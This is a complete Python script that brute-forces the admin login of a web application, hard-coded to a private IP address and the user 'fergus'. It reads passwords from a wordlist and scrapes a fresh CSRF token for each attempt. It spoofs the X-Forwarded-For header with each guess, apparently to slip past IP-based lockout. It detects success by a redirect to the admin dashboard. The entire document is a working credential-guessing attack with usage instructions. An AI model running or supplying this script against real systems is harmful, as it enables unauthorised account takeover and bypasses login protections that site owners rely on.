#!/usr/bin/python3
try:
    import re, requests, sys
except Exception:
    print(" [!] Error. Unable to import libraries. Requiered: re, requests, sys")
#-------------------------------------------------------------------------------
# Default variables
host = 'http://10.10.10.191'
login_url = host + '/admin/login/'
username = 'fergus' # YOU CAN EDIT THE USERNAME HERE
#-------------------------------------------------------------------------------
# Check sys.argv[]
try:
    if ".txt" in str(sys.argv[1]):
        print(" [!] Error. Host can't be a text file!")
        exit(1)
    elif ".txt" not in str(sys.argv[1]):
        host = str(sys.argv[1])
        login_url = host + "/admin/login/"

    if ".txt" not in str(sys.argv[2]):
        print(" [!] Error. Wordlist must be in a text file!")
        exit(1)
    elif ".txt" in str(sys.argv[2]):
        wordlist_filename = str(sys.argv[2])
except Exception:
    print(" [!] Error. Invalid arguments.")
    print(" Usage: python3 %s <target> <wordlist.txt>" % sys.argv[0])
    print(" Make sure you change the user in the code! Actual user: " + username)
    exit(1)
#-------------------------------------------------------------------------------
# Showing invalid passwords without changing the line
def invalid(text):
    sys.stdout.flush()
    sys.stdout.write('\r [!] Bad password: ' + text + "            ")
#-------------------------------------------------------------------------------
# The actual bruteforce
try:
    session = requests.Session()
    print()
    with open(wordlist_filename) as w_f:
        while True:
            c_line = w_f.readline()  # Read the line
            if not c_line:  # No lines left
                print()
                print(" [!] Unable to find password for user %s..." % username)
                print()
                break
            password = c_line.strip()  # Remove line spaces / tabs
            login_page = session.get(login_url)
            csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

            data = {  # Data to be sent
                'tokenCSRF': csrf_token,
                'username': username,
                'password': password,
                'save': ''
            }
            headers = {  # Headers
                'X-Forwarded-For': password,
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
                'Referer': login_url
            }

            login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)  # Make the request

            if 'location' in login_result.headers:
                if '/admin/dashboard' in login_result.headers['location']:  # Password found
                    print()
                    print(' [+] Password found: %s' % password)
                    print()
                    break
            else:
                invalid(password)  # Password not found, go to line 33

except KeyboardInterrupt:
    print()
    print(" [!] Detected Ctrl+C, exiting...")
    exit(1)

exit(1)
